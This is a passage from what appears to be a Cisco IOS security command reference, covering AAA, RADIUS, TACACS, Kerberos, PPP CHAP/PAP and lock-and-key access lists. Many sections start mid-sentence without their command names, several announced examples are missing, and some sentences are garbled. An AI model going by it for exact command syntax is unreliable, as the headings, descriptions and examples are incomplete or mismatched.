You can also use the resume/next command, which resumes the next connection in the user's 
list of connections. This function allows you to create a single menu entry that steps through all of 
the user's connections. 
Refer to the Access Services Configuration Guide for more information on the menu command. 
Example
The following example shows how to specify the commands to be executed when a user enters 
the selection number associated with the menu entry for the menu named Access1: 
menu Access1 command 1 tn3270 vms.cisco.com
menu Access1 command 2 rlogin unix.cisco.com
menu Access1 command 3 menu-exit

[12.1.7] menu title 
Use the menu title global configuration command to create a title, or banner, for a user menu. 
menu name title delimiter 
Syntax Description
name 	The configuration name of the menu. You can specify a maximum of 20 characters. 	
delimiter 	Characters that mark the beginning and end of a title. Text delimiters are 
characters that do not ordinarily appear within the text of a title, such as slash ( / ), double quote 
("), and tilde ( ~ ). Ctrl-C is reserved for special use and should not be used in the text of the title. 	
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
The menu title command must use the same menu name used with the menu text and menu 
command commands used to create a menu. 
You can position the title of the menu horizontally by preceding the title text with blank characters. 
You can also add lines of space above and below the title by pressing Return. 
Follow the title keyword with one or more blank characters and a delimiting character of your 
choice. Then enter one or more lines of text, ending the title with the same delimiting character. 
You cannot use the delimiting character within the text of the message. 
When you are configuring from a terminal and are attempting to include special control 
characters, such as a screen-clearing string, you must use Ctrl-V before the special control 
characters so that they are accepted as part of the title string. The string ^[[H^[[J is an escape 
string used by many VT100-compatible terminals to clear the screen. To use a special string, you 
must enter Ctrl-V before each escape character. 
You also can use the clear-screen option of the menu command to clear the screen before 
displaying menus and submenus, instead of embedding a terminal-specific string in the menu 
title. The clear-screen option allows the same menu to be used on different types of terminals. 
Example
The following example specifies the title that will be displayed when the menu Access1 is 
invoked: 
cs101(config)# menu Access1 title /^[[H^[[J
               Welcome to Access1 Internet Services
               
                  Type a number to select an option;
                           Type 9 to exit the menu.

[12.2.2] Network Access Security Commands
This chapter describes the commands used to manage security on the network. 

[12.2.3] aaa authentication arap 
To enable an Authentication Authorization and Accounting (AAA) authentication method for 
AppleTalk Remote Access (ARA) users using TACACS+, use the aaa authentication arap 
global configuration command. Use the no form of this command to disable this authentication. 
aaa authentication arap {default | list-name} method1 [...[method4]] 
no aaa authentication arap {default | list-name} method1 [...[method4]] 
Syntax Description
default 	Uses the listed methods that follow this argument as the default list of methods when a 
user logs in. 	
list-name 	Character string used to name the following list of authentication methods tried 
when a user logs in. 	
method 	One of the keywords described in Table 1. 	
Default
If the default list is not set, only the local user database is checked. This version has the same 
effect as the following command: 
aaa authentication arap default local
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.3. 
The list names and default that you set with the aaa authentication arap command are used 
with the arap authentication command. These lists can contain up to four authentication 
methods that are used when a user tries to log in with ARA. Note that ARAP guest logins are 
disabled by default when you enable AAA/TACACS+. To allow guest logins, you must use either 
the guest or auth-guest method listed in Table 1. You can only use one of these methods; they 
are mutually exclusive. 
Create a list by entering the aaa authentication arap list-name method command, where list-
name is any character string used to name this list (such as MIS-access.) The method argument 
identifies the list of methods the authentication algorithm tries in the given sequence. You can 
enter up to four methods. 

Use the show running-config command to view lists of authentication methods. 
Table 1 AAA Authentication ARAP Methods 
Keyword 	Description 	
guest 	Allows guest logins. This method must be the first method listed, but it can be followed by 
other methods if it does not succeed. 	
auth-guest 	Allows guest logins only if the user has already logged in to EXEC. This method 
must be the first method listed, but can be followed by other methods if it does not succeed. 	
line 	Uses the line password for authentication. 	
local 	Uses the local username database for authentication. 	
tacacs+ 	Uses TACACS+ authentication. 	
radius 	Uses RADIUS authentication. 	

Note This command cannot be used with TACACS or extended TACACS. 

Examples
The following example creates a list called MIS-access, which first tries TACACS+ authentication 
and then none: 
aaa authentication arap MIS-access tacacs+ none
The following example creates the same list, but sets it as the default list that is used for all ARA 
protocol authentications if no other list is specified: 
aaa authentication arap default tacacs+ none

Syntax Description
method 	At least one and up to four of the keywords described in Table 2. 	
Default
If the default list is not set, only the enable password is checked. This version has the same 
effect as the following command: 
aaa authentication enable default enable
On the console, the enable password is used if it exists. If no password is set, the process will 
succeed anyway. 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.3. 
Use the aaa authentication enable default command to create a series of authentication 
methods that are used to determine whether a user can access the privileged command level. 
You can specify up to four authentication methods. Method keywords are described in Table 2. 
The additional methods of authentication are used only if the previous method returns an error, 
not if it fails. To specify that the authentication should succeed even if all methods return an error, 
specify none as the final method in the command line. 
If a default authentication routine is not set for a function, the default is none and no 
authentication is performed. Use the show running-config command to view currently 
configured lists of authentication methods. 
Table 2 AAA Authentication Enable Default Methods 
Keyword 	Description 	
enable 	Uses the enable password for authentication. 	
line 	Uses the line password for authentication. 	
none 	Uses no authentication. 	
tacacs+ 	Uses TACACS+ authentication. 	
radius 	Uses RADIUS authentication. 	

Note This command cannot be used with TACACS or extended TACACS. 

Example
The following example creates an authentication list that first tries to contact a TACACS+ server. 
If no server can be found, AAA tries to use the enable password. If this attempt also returns an 
error (because no enable password is configured on the server), the user is allowed access with 
no authentication.

Usage Guidelines
This command first appeared in Cisco IOS Release 10.3. 
This command is useful when you want to configure an override to the normal authentication 
process for certain personnel such as system administrators. 
When this override is set, the user is always prompted for the username. The system then checks 
to see if the entered username corresponds to a local account. If the username does not 
correspond to one in the local database, login proceeds with the methods configured with other 
aaa commands (such as aaa authentication login). Note that when using this command 
Username: is fixed as the first prompt.

Note On the console, login will succeed without any authentication checks if default is not set. 

Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.3. 
The default and optional list names that you create with the aaa authentication login command 
are used with the login authentication command. 
Create a list by entering the aaa authentication list-name method command for a particular 
protocol, where list-name is any character string used to name this list (such as MIS-access). The 
method argument identifies the list of methods that the authentication algorithm tries, in the given 
sequence. Method keywords are described in Table 3. 
To create a default list that is used if no list is assigned to a line, use the login authentication 
command with the default argument followed by the methods you want to use in default 
situations. 
The additional methods of authentication are used only if the previous method returns an error, 
not if it fails. To ensure that the authentication succeeds even if all methods return an error, 
specify none as the final method in the command line. 
If authentication is not specifically set for a line, the default is to deny access and no 
authentication is performed. Use the show running-config command to display currently 
configured lists of authentication methods.

addr=x 	A network address. Used with service=slip, service=ppp, and protocol=ip. Contains the IP 
address that the remote host should use when connecting via SLIP or PPP/IP. For example, 
addr=1.2.3.4. 	yes 	yes 	yes 	
addr-pool=x 	Specifies the name of a local pool from which to get the address of the remote 
host. Used with service=ppp and protocol=ip. 
Note that addr-pool works in conjunction with local pooling. It specifies the name of a local pool 
(which must be preconfigured on the network access server). Use the ip-local pool command to 
declare local pools. For example: 
ip address-pool local 
ip local pool boo 1.0.0.1 1.0.0.10 
ip local pool moo 2.0.0.1 2.0.0.20 
You can then use TACACS+ to return addr-pool=boo or addr-pool=moo to indicate the address 
pool from which you want to get this remote node's address. 	yes 	yes 	yes 	
routing=x 	Specifies whether routing information is to be propagated to, and accepted from 
this interface. Used with service=slip, service=ppp, and protocol=ip. Equivalent in function to the 
/routing flag in SLIP and PPP commands. Can either be true or false (for example, routing=true). 
	yes 	yes 	yes 	
route 	Specifies a route to be applied to an interface. Used with service=slip, service=ppp, and 
protocol=ip. 
During network authorization, the route attribute can be used to specify a per-user static route, to 
be installed by TACACS+ as follows: 
route=" dst_address mask [ gateway ]" 
This indicates a temporary static route that is to be applied. dst_address, mask, and gateway are 
expected to be in the usual dotted-decimal notation, with the same meanings as in the familiar ip 
route configuration command on a network access server. 
If gateway is omitted, the peer's address is the gateway. The route is expunged when the 
connection terminates. 	no 	yes 	yes 	
route#<n> 	Like the route AV pair, this specifies a route to be applied to an interface, but 
these routes are numbered, allowing multiple routes to be applied. Used with service=ppp and 
protocol=ip, and service=ppp and protocol=ipx. 	no 	no 	11.2(4)F 	
timeout=x 	The number of minutes before an ARA session disconnects (for example, 
timeout=60). A value of zero indicates no timeout. Used with service=arap. 	yes 	yes 
	yes

[12.3.2] aaa authorization config-commands 
To disable AAA configuration command authorization in the EXEC mode, use the no form of the 
aaa authorization config-commands global configuration command. Use the standard form of 
this command to reestablish the default created when the aaa authorization command level 
method command was issued. 
aaa authorization config-commands 
no aaa authorization config-commands 
Syntax Description
This command has no arguments or keywords. 
Default
After the aaa authorization command level method has been issued, this command is enabled 
by default---meaning that all configuration commands in the EXEC mode will be authorized. 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.2. 
If aaa authorization command level method is enabled, all commands, including configuration 
commands, are authorized by AAA using the method specified. Because there are configuration 
commands that are identical to some EXEC-level commands, there can be some confusion in the 
authorization process. Using no aaa authorization config-commands stops the network access 
server not from attempting configuration command authorization. 
Once the no form of this command has been issued, AAA authorization of configuration 
commands is completely disabled. Care should be taken before issuing the no form of this 
command because it potentially reduces the amount of administrative control on configuration 
commands. 
Use the aaa authorization config-commands command if, after using the no form of this 
command, you need to reestablish the default set by the aaa authorization command level 
method command. 
Example
The following example specifies that TACACS+ authorization is run for level 15 commands and 
that AAA authorization of configuration commands is disabled: 
aaa new-model
aaa authorization command 15 tacacs+ none
no aaa authorization config-commands

[12.3.3] aaa new-model 
To enable the AAA access control model, issue the aaa new-model global configuration 
command. Use the no form of this command to disable this functionality. 
aaa new-model 
no aaa new-model 
Syntax Description
This command has no arguments or keywords. 
Default
AAA is not enabled. 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
This command enables the AAA access control system and TACACS+. If you initialize AAA 
functionality and later decide to use TACACS or extended TACACS, issue the no version of this 
command before you enable the version of TACACS that you want to use. 
After enabling AAA/TACACS+ with the aaa new-model command, you must use the tacacs-
server key command to set the authentication key used in all TACACS+ communications with 
the TACACS+ daemon. 
Example
The following example initializes AAA and TACACS+:

command. Use the no form of the command to disable authentication for an ARA line. 
arap authentication {default | list-name} 
no arap authentication {default | list-name} 
 
Caution If you use a list-name value that was not configured with the aaa authentication arap 
command, ARA protocol will be disabled on this line. 
Syntax Description
default 	Default list created with the aaa authentication arap command. 	
list-name 	Indicated list created with the aaa authentication arap command. 	
Default
ARA protocol authentication uses the default set with aaa authentication arap command. If no 
default is set, the local user database is checked. 
Command Mode
Line configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.0. 
This command is a per-line command that specifies the name of a list of AAA authentication 
methods to try at login. If no list is specified, the default list is used (whether or not it is specified 
in the command line). You create defaults and lists with the aaa authentication arap command. 
Entering the no version of arap authentication has the same effect as entering the command 
with the default argument. 
Before issuing this command, create a list of authentication processes by using the aaa 
authentication arap global configuration command. 
Example
The following example specifies that the TACACS+ authentication list called MIS-access is used 
on ARA line 7: 
line 7

command do not respond, use the enable last-resort global configuration command. Use the no 
form of this command to restore the default. 
enable last-resort {password | succeed} 
no enable last-resort {password | succeed} 
Syntax Description
password 	Allows you to enter enable mode by entering the privileged command level 
password. A password must contain from 1 to 25 uppercase and lowercase alphanumeric 
characters. 	
succeed 	Allows you to enter enable mode without further question. 	
Default

level, use the enable use-tacacs global configuration command. Use the no form of this 
command to disable TACACS verification. 
enable use-tacacs 
no enable use-tacacs 

Caution If you use the enable use-tacacs command, you must also use the tacacs-server 
authenticate enable command, or you will be locked out of the privileged command level. 
Syntax Description
This command has no arguments or keywords. 
Default
Disabled 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
When you add this command to the configuration file, the EXEC enable command prompts for a 
new username and password pair. This pair is then passed to the TACACS server for 
authentication. If you are using extended TACACS, it also passes any existing UNIX user 
identification code to the server. 

Note This command initializes TACACS. Use the tacacs server-extended command to initialize 
extended TACACS, or use the aaa new-model command to initialize AAA/TACACS+. 

Example
The following example sets TACACS verification on the privileged EXEC-level login sequence:

[12.3.8] ip radius source-interface 
Use the ip radius source-interface global configuration command to force RADIUS to use the IP 
address of a specified interface for all outgoing RADIUS packets. Use the no form of this 
command to disable use of a specified interface IP address. 
ip radius source-interface subinterface-name 
no ip radius source-interface 
Syntax Description
subinterface-name 	Name of the interface that RADIUS uses for all of its outgoing packets. 	
Default
This command has no factory-assigned default. 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.1. 
Use this command to set a subinterface's IP address to be used as the source address for all 
outgoing RADIUS packets. This address is used as long as the interface is in the up state. In this 
way, the RADIUS server can use one IP address entry for every network access client instead of 
maintaining a list of IP addresses. 
This command is especially useful in cases where the router has many interfaces, and you want 
to ensure that all RADIUS packets from a particular router have the same IP address. 
The specified interface must have an IP address associated with it. If the specified subinterface 
does not have an IP address or is in a down state, then RADIUS reverts to the default. To avoid 
this, add an IP address to the subinterface or bring the interface to the up state. 
Example
The following example makes RADIUS use the IP address of subinterface s2 for all outgoing 
RADIUS packets: 
ip radius source-interface s2

form of this command to remove a SRVTAB entry from the router's configuration. 
kerberos srvtab entry kerberos-principle principle-type timestamp key-version number 
key-type key-length encrypted-keytab 
no kerberos srvtab entry kerberos-principle principle-type 
Syntax Description
kerberos-principle 	A service on the router. 	
principle-type 	Version of the Kerberos SRVTAB. 	
timestamp 	Number representing the date and time the SRVTAB entry was created. 	
key-version number 	Version of the encryption key format. 	
key-type 	Type of encryption used. 	
key-length 	Length, in bytes, of the encryption key. 	
encrypted-keytab 	Secret key the router shares with the KDC. It is encrypted with the 
private Data Encryption Standard (DES) key (if available) when you write out your configuration. 	
Command Mode
Global configuration. 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.2. 
When you use the kerberos srvtab remote command to copy the SRVTAB file from a remote 
host (generally the KDC), it parses the information in this file and stores it in the router's running 
configuration in the kerberos srvtab entry format. The key for each SRVTAB entry is encrypted 
with a private DES key if one is defined on the router. To ensure that the SRVTAB is available 
(that is, that it does not need to be acquired from the KDC) when you reboot the router, use the 
write memory router configuration command to write the router's running configuration to 
NVRAM. 
If you reload a configuration, with a SRVTAB encrypted with a private DES key, on to a router 
that does not have a private DES key defined, the router displays a message informing you that 
the SRVTAB entry has been corrupted, and discards the entry. 
If you change the private DES key and reload an old version of the router's configuration that 
contains SRVTAB entries encrypted with the old private DES keys, the router will restore your 
Kerberos SRVTAB entries, but the SRVTAB keys will be corrupted. In this case, you must delete 
your old Kerberos SRVTAB entries and reload your Kerberos SRVTABs on to the router using the 
kerberos srvtab remote command. 
Although you can configure kerberos srvtab entry on the router manually, generally you would 
not do this because the keytab is encrypted automatically by the router when you copy the 
SRVTAB using the kerberos srvtab remote command. 
Example
In the following example, host/new-router.loki.com@LOKI.COM is the host, 0 is the type, 
817680774 is the timestamp, 1 is the version of the key, 1 indicates the DES is the encryption 
type, 8 is the number of bytes, and .cCN.YoU.okK is the encrypted key: 
kerberos srvtab entry host/new-router.loki.com@LOKI.COM 0 817680774 1 1 8 .cCN.YoU.okK

Usage Guidelines
This command first appeared in Cisco IOS Release 11.1. 
This command is a per-line command used with AAA authentication that specifies the name of a 
list of TACACS+ authentication methods to try at login. If no list is specified, the default list is 
used, even if it is specified in the command line. (You create defaults and lists with the aaa 
authentication nasi command.) Entering the no form of this command has the same effect as 
entering the command with the default argument. 

Caution If you use a list-name value that was not configured with the aaa authentication nasi 
command, you will disable login on this line. 
Before issuing this command, create a list of authentication processes by using the aaa 
authentication nasi global configuration command. 
Examples
The following example specifies that the default AAA authentication be used on line 4: 
line 4
nasi authentication default
The following example specifies that the AAA authentication list called list1 be used on line 7:

selected on the interface, use the ppp authentication interface configuration command. Use the 
no form of the command to disable this authentication. 
ppp authentication {chap | chap pap | pap chap | pap } [if-needed] [list-name | default] 
[callin] 
no ppp authentication 
Syntax Description
chap 	Enables CHAP on a serial interface. 	
pap 	Enables PAP on a serial interface. 	
chap pap 	Enables both CHAP and PAP, and performs CHAP authentication before PAP. 	
pap chap 	Enables both CHAP and PAP, and performs PAP authentication before CHAP. 	
if-needed 	(Optional) Used with TACACS and extended TACACS. Does not perform CHAP 
or PAP authentication if the user has already provided authentication. This option is available only 
on asychronous interfaces. 	
list-name 	(Optional) Used with AAA/TACACS+. Specifies the name of a list of TACACS+ 
methods of authentication to use. If no list name is specified, the system uses the default. The list 
is created with the aaa authentication ppp command. 	
default 	The name of the method list is created with the aaa authentication ppp command. 	
callin 	Specifies authentication on incoming (received) calls only. 	
 Caution If you use a list-name value that was not configured with the aaa authentication 
ppp command, you will disable PPP on this interface. 
Default
PPP authentication is not enabled. 
Command Mode
Interface configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
When you enable CHAP or PAP Authentication, or both, the local router requires the remote 
device to prove its identity before allowing data traffic to flow. PAP Authentication requires the 
remote device to send a name and password, which is checked against a matching entry in the 
local username database or in the remote TACACS/TACACS+ database. CHAP Authentication 
sends a Challenge to the remote device. The remote device encrypts the challenge value with a 
shared secret and returns the encrypted value and its name to the local Router in a Response 
message. The local router attempts to match the remote device's name with an associated secret 
stored in the local username or remote TACACS/TACACS+ database; it uses the stored secret to 
encrypt the original challenge and verify that the encrypted values match. 
You can enable PAP or CHAP, or both, in either order. If you enable both methods, the first 
method specified is requested during link negotiation. If the peer suggests using the second 
method, or refuses the first method, the second method is tried. Some remote devices support 
only CHAP, and some support only PAP. Base the order in which you specify methods on the 
remote device's ability to correctly negotiate the appropriate method, and on the level of data line 
security you require. PAP usernames and passwords are sent as cleartext strings, which can be 
intercepted and reused. CHAP has eliminated most of the known security holes. 
Enabling or disabling PPP authentication does not affect the local router's willingness to 
authenticate itself to the remote device. 
If you are using autoselect on a TTY line, you probably want to use the ppp authentication 
command to turn on PPP authentication for the corresponding interface. 
Example
The following example enables CHAP on asynchronous interface 4 and uses the authentication 
list MIS-access: 
interface async 4

encapsulation ppp

ppp authentication chap MIS-access

that all appear to be the same host when authenticating with CHAP. To disable this function, use 
the no form of the command. 
ppp chap hostname hostname 
no ppp chap hostname hostname 
Syntax Description
hostname 	The name sent in the CHAP challenge. 	
Default
Disabled. The router name is sent in any CHAP challenges. 
Command Mode
Interface configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.2. 
Currently, a router dialing a pool of access routers requires a username entry for each possible 
router in the pool because each router challenges with its hostname. If a router is added to the 
dialup rotary pool, all connecting routers must be updated. The ppp chap hostname command 
allows you to specify a common alias for all routers in a rotary group to use so that only one 
username must be configured on the dialing routers. 
This command is normally used with local CHAP authentication (when the router authenticates to 
the peer), but it can also be used for remote CHAP authentication. 
Example
The commands in the following example identify the dialer interface 0 as the dialer rotary group 
leader and specifies ppp as the method of encapsulation used by all member interfaces. CHAP 
authentication is used on received calls only. The username ISPCorp will be sent in all CHAP 
challenges and responses.

software images) to configure a common CHAP secret password to use in response to 
challenges from an unknown peer. To disable this function, use the no form of this command. 
ppp chap password secret 
no chap password secret 
Syntax Description
secret 	The secret used to compute the response value for any CHAP challenge from an 
unknown peer. 	
Default
Disabled. 
Command Mode
Interface configuration. 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.2. 
This command allows you to replace several username and password configuration commands 
with a single copy of this command on any dialer interface or asynchronous group interface. 
This command is used for remote CHAP authentication only (when routers authenticate to the 
peer) and does not affect local CHAP authentication. 
Example
The commands in the following example specify Integrated Services Digital Network (ISDN) Basic 
Rate Interface (BRI) number 0. The method of encapsulation on the interface is PPP. If a CHAP 
challenge is received from a peer whose name is not found in the global list of usernames, the 
encrypted secret 7 1267234591 is decrypted and used to create a CHAP response value.

Usage Guidelines
This command first appeared in Cisco IOS Release 11.2. 
Use this command to reenable remote PAP support (for example to respond to the peer's request 
to authenticate with PAP) and to specify the parameters to be used when sending the PAP 
Authentication Request. 
This is a per-interface command. 
Example
The commands in the following example identify dialer interface 0 as the dialer rotary group

applies only when using CHAP authentication. 	
Default
TACACS is not used for PPP authentication. 
Command Mode 
Interface configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.3. 
This is a per-interface command. Use this command only when you have set up an extended 
TACACS server. 
When CHAP authentication is being used, the ppp use-tacacs command with the single-line 
option specifies that if a username and password are specified in the username, separated by an 
asterisk (*), a standard TACACS login query is performed using that username and password. If 
the username does not contain an asterisk, then normal CHAP authentication is performed. 
This feature is useful when integrating TACACS with other authentication systems that require a 
cleartext version of the user's password. Such systems include one-time password systems, 
token card systems, and Kerberos. 
 Caution Normal CHAP authentications prevent the cleartext password from being 
transmitted over the link. When you use the single-line option, passwords cross the link as 
cleartext. 
If the username and password are contained in the CHAP password, the CHAP secret is not 
used by the Cisco IOS software. Because most PPP clients require that a secret be specified, 
you can use any arbitrary string, and the Cisco IOS software ignores it. 
Examples
In the following example, asynchronous serial interface 1 is configured to use TACACS for CHAP 
authentication: 
interface async 1

[12.5.7] radius-server dead-time 
To improve RADIUS response times when some servers might be unavailable, use the radius-
server dead-time global configuration command to cause the unavailable servers to be skipped 
immediately. Use the no form of this command to set dead-time to 0. 
radius-server dead-time minutes 
no radius-server dead-time 
Syntax Description
minutes 	Length of time a RADIUS server is skipped over by transaction requests, up to a 
maximum of 1440 minutes (24 hours). 	
Default
Dead time is set to 0. 
Command Mode
Global configuration 
Usage Guidelines
Use this command to cause the Cisco IOS to mark as "dead" RADIUS servers that fail to respond 
to authentication requests, thus avoiding the wait for the request to time out before trying the next 
configured server. A RADIUS server marked as "dead" is skipped by additional requests for the 
duration of minutes or unless there are no servers not marked "dead." 
Example
The following example specifies 5 minutes dead-time for RADIUS servers that fail to respond to 
authentication requests. 
radius-server dead-time 5

Use the no form of this command to delete the specified RADIUS host. 
radius-server host {hostname | ip-address} [auth-port port-number] [acct-port port-number] 
no radius-server host {hostname | ip-address} 
Syntax Description
hostname 	DNS name of the RADIUS server host. 	
ip-address 	IP address of the RADIUS server host. 	
auth-port 	Specifies the UDP destination port for authentication requests. 	
port-number 	Port number for authentication requests; the host is not used for authentication if 
set to 0. 	
acct-port 	Specifies the UDP destination port for accounting requests. 	
port-number 	Port number for accounting requests; the host is not used for accounting if set to 
0. 	
Default
No RADIUS host is specified. 
Command Mode
Global configuration 
Usage Guidelines
You can use multiple radius-server host commands to specify multiple hosts. The software 
searches for hosts in the order you specify them. 
Example
The following example specifies host1 as the RADIUS server and uses default ports for both 
accounting and authentication. 
radius-server host host1.company.com
The following example specifies port 12 as the destination port for authentication requests and 
port 16 as the destination port for accounting requests on a RADIUS host named host1: 
radius-server host host1.company.com auth-port 12 acct-port 16
Note that because entering a line resets all the port numbers, you must specify a host and 
configure accounting and authentication ports on a single line. 
To use separate servers for accounting and authentication, use the zero port value as 
appropriate. The following example specifies that RADIUS server host1 be used for accounting 
but not for authentication, and that RADIUS server host2 be used for authentication but not for 
accounting: 
       radius-server host host1.company.com auth-port 0
       radius-server host host2.company.com acct-port 0

Usage Guidelines
The tacacs-server authenticate [connection | enable] command first appeared in Cisco IOS 
Release 10.0. The tacacs-server authenticate {connection [always]enable | slip [always] 
[access-lists]} command first appeared in Cisco IOS Release 10.3. 
Enter one of the keywords to specify the action (when a user enters enable mode, for example). 
Before you use the tacacs-server authenticate command, you must enable the tacacs-server 
extended command. 

Note This command is not used in AAA/TACACS+. It has been replaced by the aaa 
authorization command. 

Example
The following example configures TACACS logins that authenticate users to use Telnet or rlogin:

[12.6.6] tacacs-server directed-request 
To send only a username to a specified server when a direct request is issued, use the tacacs-
server directed-request global configuration command. Use the no form of this command to 
disable the direct-request feature. 
tacacs-server directed-request 
no tacacs-server directed-request 
Syntax Description
This command has no arguments or keywords. 
Default
Enabled 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.1. 
This command sends only the portion of the username before the "@" symbol to the host 
specified after the "@" symbol. In other words, with the directed-request feature enabled, you can 
direct a request to any of the configured servers, and only the username is sent to the specified 
server. 
Disabling tacacs-server directed-request causes the whole string, both before and after the "@" 
symbol, to be sent to the default tacacs server. When the directed-request feature is disabled, the 
router queries the list of servers, starting with the first one in the list, sending the whole string, and 
accepting the first response that it gets from the server. The tacacs-server directed-request 
command is useful for sites that have developed their own TACACS server software that parses 
the whole string and makes decisions based on it. 
With tacacs-server directed-request enabled, only configured TACACS servers can be 
specified by the user after the "@" symbol. If the host name specified by the user does not match 
the IP address of a TACACS server configured by the administrator, the user input is rejected. 
Use no tacacs-server directed-request to disable the ability of the user to choose between 
configured TACACS servers and to cause the entire string to be passed to the default server. 
Example
The following example enables tacacs-server directed-request so that the entire user input is 
passed to the default TACACS server: 
no tacacs-server directed-request
tacacs-server extended 
To enable an extended TACACS mode, use the tacacs-server extended global configuration 
command. Use the no form of this command to disable the mode. 
tacacs-server extended 
no tacacs-server extended 
Syntax Description
This command has no arguments or keywords. 
Default
Disabled 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
This command initializes extended TACACS. To initialize AAA/TACACS+, use the aaa new-
model command. 
Example
The following example enables extended TACACS mode: 
tacacs-server extended
tacacs-server host 
To specify a TACACS host, use the tacacs-server host global configuration command. Use the 
no form of this command to delete the specified name or address. 
tacacs-server host hostname [single-connection] [port integer] [timeout integer] [key 
string] 
no tacacs-server host hostname 
Syntax Description
hostname 	Name or IP address of the host. 	
single-connection 	Specify that the router maintain a single open connection for confirmation 
from a AAA/TACACS+ server (CiscoSecure Release 1.0.1 or later). This command contains no 
autodetect and fails if the specified host is not running a CiscoSecure daemon. 	
port 	Specify a server port number. 	
integer 	Port number of the server (in the range 1 to 10,000). 	
timeout 	Specify a timeout value. This overrides the global timeout value set with the 
tacacs-server timeout command for this server only. 	
integer 	Integer value, in seconds, of the timeout interval. 	
key 	Specify an authentication and encryption key. This must match the key used by the 
TACACS+ daemon. Specifying this key overrides the key set by the global command tacacs-
server key for this server only. 	
string 	Character string specifying authentication and encryption key. 	
Default
No TACACS host is specified. 
Command Mode
Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
You can use multiple tacacs-server host commands to specify additional hosts. The Cisco IOS 
software searches for hosts in the order in which you specify them. Use the single-connection, 
port, timeout, and key options only when running a AAA/TACACS+ server. 
Because some of the parameters of the tacacs-server host command override global settings 
made by the tacacs-server timeout and tacacs-server key commands, you can use this 
command to enhance security on your network by uniquely configuring individual routers. 
Examples
The following example specifies a TACACS host named Sea_Change: 
tacacs-server host Sea_Change
The following example specifies that, for AAA confirmation, the router consult the CiscoSecure 
TACACS+ host named Sea_Cure on port number 51. The timeout value for requests on this 
connection is 3 seconds; the encryption key is a_secret. 
tacacs-server host Sea_Cure single-connection port 51 timeout 3 key a_secret

Usage Guidelines
This command first appeared in Cisco IOS Release 11.1. 
After enabling AAA with the aaa new-model command, you must set the authentication and 
encryption key using the tacacs-server key command. 
The key entered must match the key used on the TACACS+ daemon. All leading spaces are 
ignored; spaces within and at the end of the key are not. If you use spaces in your key, do not 
enclose the key in quotation marks unless the quotation marks themselves are part of the key. 
Example
The following example illustrates how to set the authentication and encryption key to "dare to go":

Global configuration 
Usage Guidelines
This command first appeared in Cisco IOS Release 10.0. 
When the user enters in the login name, the login request is transmitted with the name and a 
zero-length password. If accepted, the login procedure completes. If the TACACS server refuses 
this request, the server software prompts for a password and tries again when the user supplies a 
password. The TACACS server must support authentication for users without passwords to make 
use of this feature. This feature supports all TACACS requests---login, SLIP, enable, and so on. 

Note This command is not used by AAA/TACACS+. 

Example
The following example configures the first login to not require TACACS verification: 
tacacs-server optional-passwords

[12.7.3] Traffic Filter Commands
This chapter describes the commands used to configure Lock-and-key security (IP only). 
Other traffic filter commands are protocol-specific, and are therefore described in the appropriate 
protocol-specific chapters in the Cisco IOS command references. You should refer to these 
protocol-specific chapters to find detailed information about traffic filter commands for each 
protocol. (Many of these protocols refer to the filters as "access lists.") 
Specific information about configuring traffic filters (access lists) for these protocols can be found 
in protocol-specific chapters in the Cisco IOS configuration guides. General guidelines for using 
access lists can be found in the "Configuring Traffic Filters" chapter of the Security Configuration 
Guide. 
Lock-and-key security is implemented with extended IP dynamic access lists. Lock-and-key 
security is available only for IP traffic, but provides more security functions than traditional static 
traffic filters. 

[12.7.4] access-enable 
To enable the router to create a temporary access list entry in a dynamic access list, use the 
access-enable EXEC command. 
access-enable [host] [timeout minutes] 
Syntax Description
host 	(Optional) Tells the software to enable access only for the host from which the 
Telnet session originated. If not specified, the software allows all hosts on the defined network to 
gain access. The dynamic access list contains the network mask to use for enabling the new 
network. 	
timeout minutes 	(Optional) Specifies an idle timeout for the temporary access list entry. If 
the access list entry is not accessed within this period, it is automatically deleted and requires the 
user to authenticate again. The default is for the entries to remain permanently. We recommend 
that this value equal the idle timeout set for the WAN connection. 	
Command Mode
EXEC 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.1. 
This command enables the lock-and-key access feature. 
You should always define either an idle timeout (with the timeout keyword in this command) or 
an absolute timeout (with the timeout keyword in the access-list command). Otherwise, the 
temporary access list entry will remain, even after the user terminates the session. 
Example
The following example causes the software to create a temporary access list entry and tells the 
software to enable access only for the host from which the Telnet session originated. If the 
access list entry is not accessed within 2 minutes, it is deleted. 
autocommand access-enable host timeout 2

[12.7.5] access-template 
To manually place a temporary access list entry on a router to which you are connected, use the 
access-template EXEC command. 
access-template [access-list-number | name] [dynamic-name] [source] [destination] [timeout 
minutes] 
Syntax Description
access-list-number 	Number of the dynamic access list. 	
name 	Name of an IP access list. The name cannot contain a space or quotation mark, 
and must begin with an alphabetic character to avoid ambiguity with numbered access lists. 	
dynamic-name 	(Optional) Name of a dynamic access list. 	
source 	(Optional) Source address in a dynamic access list. The keywords host and 
any are allowed. All other attributes are inherited from the original access-list entry. 	
destination 	(Optional) Destination address in a dynamic access list. The keywords host and 
any are allowed. All other attributes are inherited from the original access-list entry. 	
timeout minutes 	(Optional) Specifies a maximum time limit for each entry within this 
dynamic list. This is an absolute time, from creation, that an entry can reside in the list. The 
default is an infinite time limit and allows an entry to remain permanently. 	
Command Mode
EXEC 
Usage Guidelines
This command first appeared in Cisco IOS Release 11.1. 
This command provides a way to enable the lock-and-key access feature. 
